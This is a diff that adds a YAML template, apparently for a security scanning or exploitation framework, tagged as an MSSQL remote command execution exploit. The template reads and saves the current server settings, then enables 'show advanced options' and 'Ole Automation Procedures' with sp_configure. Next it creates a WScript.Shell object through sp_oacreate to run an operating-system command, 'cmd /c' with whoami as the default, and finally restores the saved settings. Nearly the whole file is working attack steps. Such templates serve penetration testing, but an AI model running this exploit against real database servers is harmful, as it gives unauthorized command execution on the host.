@@ -1,0 +1,43 @@
+id: mssql-ole-automation-exec
+service: [mssql]
+variables:
+  cmd: whoami
+info:
+  name: MSSQL OLE Automation Command Execution
+  severity: critical
+  tags: mssql,exploit,rce,ole
+
+services:
+  - ops:
+      - db: "SELECT 'ole_status=' + CAST(value_in_use AS varchar(10)) FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
+        name: ole_check
+      - db: "SELECT 'adv_status=' + CAST(value_in_use AS varchar(10)) FROM sys.configurations WHERE name = 'show advanced options'"
+        name: adv_check
+    extractors:
+      - type: regex
+        name: ole_orig
+        internal: true
+        part: ole_check
+        regex: ['(?m)^ole_status=([01])']
+        group: 1
+      - type: regex
+        name: adv_orig
+        internal: true
+        part: adv_check
+        regex: ['(?m)^adv_status=([01])']
+        group: 1
+
+  - ops:
+      - db: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE"
+      - db: "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE"
+      - db: "DECLARE @obj INT; EXEC sp_oacreate 'WScript.Shell', @obj OUTPUT; EXEC sp_oamethod @obj, 'Run', NULL, 'cmd /c {{cmd}}'; EXEC sp_oadestroy @obj"
+        name: ole_result
+    extractors:
+      - type: regex
+        name: mssql_ole_result
+        part: ole_result
+        regex: ['(?m)^(.+)$']
+
+  - ops:
+      - db: "EXEC sp_configure 'Ole Automation Procedures', {{ole_orig}}; RECONFIGURE"
+      - db: "EXEC sp_configure 'show advanced options', {{adv_orig}}; RECONFIGURE"
